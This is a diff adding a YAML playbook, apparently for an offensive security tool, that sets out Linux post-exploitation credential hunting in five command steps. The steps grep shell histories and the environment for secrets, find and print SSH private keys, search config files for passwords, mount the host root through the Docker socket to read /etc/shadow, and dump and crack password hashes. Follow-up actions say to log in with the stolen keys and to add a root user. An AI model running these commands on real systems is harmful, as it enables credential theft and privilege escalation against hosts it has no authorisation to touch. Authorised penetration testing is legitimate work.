@@ -1,0 +1,88 @@
+id: linux-credential-hunting
+name: Linux Post-Exploitation & Credential Hunting
+category: post-exploitation
+description: Systematic methodology for extracting cleartext passwords, API keys, private SSH keys, memory artifacts, bash histories, Docker sockets, and database configurations on Linux hosts.
+requires_shell: true
+target_os: linux
+tags:
+  - post-exploitation
+  - linux
+  - credential-hunting
+  - ssh-keys
+  - bash-history
+  - docker
+  - memory-dump
+steps:
+  - id: lcred-shell-history-env
+    title: Shell History, Environment & Session Credential Discovery
+    phase: post-exploitation
+    purpose: Inspect bash/zsh command histories, environment variables, and active processes for hardcoded passwords, tokens, and credentials.
+    command: cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null | grep -iE 'pass|pwd|secret|key|token|ssh|admin|login|mysql|curl|sudo' | head -n 40; env | grep -iE 'pass|token|secret|key|db'
+    expected_output:
+      - 'mysql -u root -pPassword123'
+      - 'export AWS_SECRET_ACCESS_KEY=...'
+    common_mistakes:
+      - Users might have set HISTCONTROL=ignorespace. Check /var/log/auth.log or syslog if readable.
+    if_success: Plaintext credentials discovered! Test on local su root and across target network services.
+    if_failure: History files sanitized or empty. Proceed to file system configuration hunting.
+    references:
+      - https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sensitive-files
+
+  - id: lcred-ssh-keys-hunting
+    title: Harvest SSH Private Keys & Authorized Keys
+    phase: post-exploitation
+    purpose: Locate and extract unprotected RSA/ECDSA/ED25519 private SSH keys across /home, /root, backups, and temporary directories.
+    command: find / -name "id_rsa*" -o -name "id_ed25519*" -o -name "id_ecdsa*" -o -name "authorized_keys" 2>/dev/null | grep -v "/proc/" | while read line; do ls -la "$line"; cat "$line" 2>/dev/null | head -n 5; done
+    expected_output:
+      - '-----BEGIN OPENSSH PRIVATE KEY-----'
+      - '-----BEGIN RSA PRIVATE KEY-----'
+    common_mistakes:
+      - Remember to set chmod 600 id_rsa on your attacker machine before attempting SSH connection.
+    if_success: Private SSH key extracted! Attempt SSH login `ssh -i id_rsa user@{{TARGET}}`.
+    if_failure: SSH keys encrypted with passphrase. Crack passphrase using ssh2john.py and John the Ripper.
+    references:
+      - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+
+  - id: lcred-config-web-db-hunting
+    title: Search Configuration Files & Database Credentials
+    phase: post-exploitation
+    purpose: Search common web and database config files (wp-config.php, config.php, .env, settings.py, database.yml) for database and administrative passwords.
+    command: grep -rnwiE --color=always 'password|passwd|db_pass|secret_key|api_key' /var/www/ /etc/ /opt/ /srv/ 2>/dev/null | grep -vE 'Binary file|node_modules|.git|/usr/share/' | head -n 50
+    expected_output:
+      - 'DB_PASSWORD=SuperSecretPass2026!'
+      - "define( 'DB_PASSWORD', 'wp_db_pass' );"
+    common_mistakes:
+      - "Don't forget hidden .env and .git/config files (find / -name \".env\" 2>/dev/null)."
+    if_success: Database credentials found! Access database or test password reuse against local root.
+    if_failure: No passwords found in common paths. Search user home directories.
+    references:
+      - https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+
+  - id: lcred-docker-socket-abuse
+    title: Docker Socket Abuse for Root Filesystem Mounting
+    phase: privesc
+    purpose: If the current user has access to /var/run/docker.sock or belongs to the docker group, spawn a container with the root host filesystem mounted at /mnt.
+    command: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh -c 'id; cat /etc/shadow | head -n 5'
+    expected_output:
+      - 'uid=0(root) gid=0(root) groups=0(root)'
+      - 'root:$6$...:19000:0:99999:7:::'
+    common_mistakes:
+      - If alpine is not present locally, check docker images and use whatever image exists on target.
+    if_success: Full root access to host filesystem! Add root user to /etc/passwd or copy /etc/shadow.
+    if_failure: Docker daemon not accessible or user not in docker group.
+    references:
+      - https://gtfobins.github.io/gtfobins/docker/
+
+  - id: lcred-shadow-passwd-hash-dump
+    title: Dump /etc/shadow & Extract Hashes for Cracking
+    phase: post-exploitation
+    purpose: Read or unshadow /etc/passwd and /etc/shadow to extract password hashes for offline dictionary cracking with hashcat/John.
+    command: unshadow /etc/passwd /etc/shadow > unshadowed.txt && head -n 10 unshadowed.txt
+    expected_output:
+      - 'root:$6$salt$encrypted_hash:0:0:root:/root:/bin/bash'
+    common_mistakes:
+      - Requires read permission on /etc/shadow (or root/shadow group).
+    if_success: "Hashes dumped! Run hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt"
+    if_failure: "/etc/shadow permission denied. Continue local privilege escalation triage."
+    references:
+      - https://hashcat.net/wiki/doku.php?id=example_hashes
